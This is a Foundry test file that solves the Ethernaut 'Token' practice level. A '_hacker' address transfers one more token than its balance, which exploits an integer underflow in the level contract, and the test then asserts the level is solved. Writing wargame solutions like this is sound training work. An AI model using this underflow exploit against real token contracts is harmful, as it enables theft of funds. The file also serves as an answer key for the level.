// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Token/Token.sol";
import "../src/Token/TokenFactory.sol";
import "../src/Ethernaut.sol";

contract TokenTest is Test {
    Ethernaut private _ethernaut;
    TokenFactory private _tokenFactory;
    Token private _token;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_tokenFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_tokenFactory);
        _token = Token(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(payable(address(_token)));
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _tokenFactory = new TokenFactory();
    }

    function testTokenHack() public testWrapper {
        // console2.log("_hacker before:", _token.balanceOf(_hacker));
        _token.transfer(address(this), _token.balanceOf(_hacker) + 1);
        // console2.log("_hacker after:", _token.balanceOf(_hacker));
    }
}
